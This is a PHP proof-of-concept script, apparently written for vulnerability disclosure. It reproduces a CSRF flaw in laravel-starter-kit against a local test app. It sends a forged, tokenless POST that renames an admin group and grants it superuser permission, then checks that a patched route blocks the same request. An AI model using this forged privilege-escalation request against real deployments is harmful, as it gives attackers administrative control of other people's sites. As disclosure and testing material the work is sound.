<?php
/**
 * PoC for brunogaspar/laravel-starter-kit CAND-657ddceac24d.
 *
 * Run directly:
 *   php PoC.php
 *
 * Run via Docker:
 *   docker build -t poc-laravel-starter-kit-csrf .
 *   docker run --rm poc-laravel-starter-kit-csrf
 */

function fail(string $message): void
{
    fwrite(STDERR, "[FAIL] {$message}\n");
    exit(1);
}

function pass(string $message): void
{
    fwrite(STDOUT, "[PASS] {$message}\n");
}

function start_server(int $port): array
{
    $router = __DIR__ . '/vulnerable_app/index.php';
    $cmd = PHP_BINARY . ' -S 127.0.0.1:' . $port . ' ' . escapeshellarg($router);
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];
    $proc = proc_open($cmd, $descriptors, $pipes, __DIR__);
    if (!is_resource($proc)) {
        fail('could not start PHP built-in server');
    }
    foreach ($pipes as $pipe) {
        stream_set_blocking($pipe, false);
    }

    $deadline = microtime(true) + 5.0;
    while (microtime(true) < $deadline) {
        $body = @file_get_contents('http://127.0.0.1:' . $port . '/health');
        if ($body === 'ok') {
            return [$proc, $pipes];
        }
        usleep(100000);
    }
    fail('server did not become ready');
}

function stop_server($proc): void
{
    if (is_resource($proc)) {
        proc_terminate($proc);
        proc_close($proc);
    }
}

function http_request(int $port, string $method, string $path, array $form = [], string $cookie = ''): array
{
    global $http_response_header;
    $http_response_header = [];
    $headers = [];
    if ($cookie !== '') {
        $headers[] = 'Cookie: ' . $cookie;
    }
    $body = http_build_query($form);
    if ($method === 'POST') {
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Content-Length: ' . strlen($body);
    }
    $context = stream_context_create([
        'http' => [
            'method' => $method,
            'header' => implode("\r\n", $headers) . "\r\n",
            'content' => $method === 'POST' ? $body : '',
            'ignore_errors' => true,
            'timeout' => 5,
        ],
    ]);
    $responseBody = file_get_contents('http://127.0.0.1:' . $port . $path, false, $context);
    if ($responseBody === false) {
        fail('HTTP request failed: ' . $method . ' ' . $path);
    }
    $status = 0;
    foreach ($http_response_header as $header) {
        if (preg_match('/^HTTP\/\S+\s+(\d+)/', $header, $m)) {
            $status = (int) $m[1];
        }
    }
    $json = json_decode($responseBody, true);
    return [$status, $responseBody, is_array($json) ? $json : null];
}

$port = 18078;
[$proc, $pipes] = start_server($port);

try {
    [$resetStatus] = http_request($port, 'GET', '/reset');
    if ($resetStatus !== 200) {
        fail('could not reset local group state');
    }

    [$stateStatus, $stateBody, $stateJson] = http_request($port, 'GET', '/state');
    if ($stateStatus !== 200 || !is_array($stateJson)) {
        fail('could not read initial state');
    }
    echo "[*] Initial state:\n{$stateBody}\n";

    $payload = [
        'name' => 'CSRF-owned Administrators',
        // base64('superuser') => 1, matching the source controller's encode/decode pattern.
        'permissions' => [base64_encode('superuser') => '1'],
        // No _token on purpose.
    ];

    [$status, $body, $json] = http_request(
        $port,
        'POST',
        '/admin/groups/1/edit',
        $payload,
        'laravel_session=admin-session'
    );

    echo "[*] Sent forged POST to vulnerable route without _token.\n";
    echo "[*] HTTP status: {$status}\n";
    echo "[*] Response body:\n{$body}\n";

    if ($status !== 200 || !is_array($json)) {
        fail('expected successful group edit from vulnerable route');
    }
    if (($json['csrf_filter_registered'] ?? true) !== false) {
        fail('vulnerable controller unexpectedly registered csrf filter');
    }
    if (($json['group']['name'] ?? '') !== 'CSRF-owned Administrators') {
        fail('group name was not modified by the forged POST');
    }
    if (($json['group']['permissions']['superuser'] ?? '') !== '1') {
        fail('group permissions were not modified by the forged POST');
    }

    pass('CSRF reproduced: admin-auth passed, csrf filter was absent, and group permissions changed without _token.');

    [$resetStatus] = http_request($port, 'GET', '/reset');
    if ($resetStatus !== 200) {
        fail('could not reset state before patched control check');
    }

    [$patchedStatus, $patchedBody] = http_request(
        $port,
        'POST',
        '/patched/admin/groups/1/edit',
        $payload,
        'laravel_session=admin-session'
    );

    echo "[*] Sent same forged POST to patched control route without _token.\n";
    echo "[*] Patched HTTP status: {$patchedStatus}\n";
    echo "[*] Patched response body:\n{$patchedBody}\n";

    if ($patchedStatus !== 419) {
        fail('patched control should reject missing _token with 419');
    }

    [$finalStatus, $finalBody, $finalJson] = http_request($port, 'GET', '/state');
    if ($finalStatus !== 200 || !is_array($finalJson)) {
        fail('could not read final state');
    }
    if (($finalJson['groups']['1']['name'] ?? '') !== 'Original Admins') {
        fail('patched control allowed state change without csrf token');
    }

    pass('control check passed: calling parent::__construct() registers csrf and blocks the forged POST.');
    echo "\nVULNERABLE: laravel-starter-kit CAND-657ddceac24d reproduced successfully.\n";
} finally {
    stop_server($proc);
}
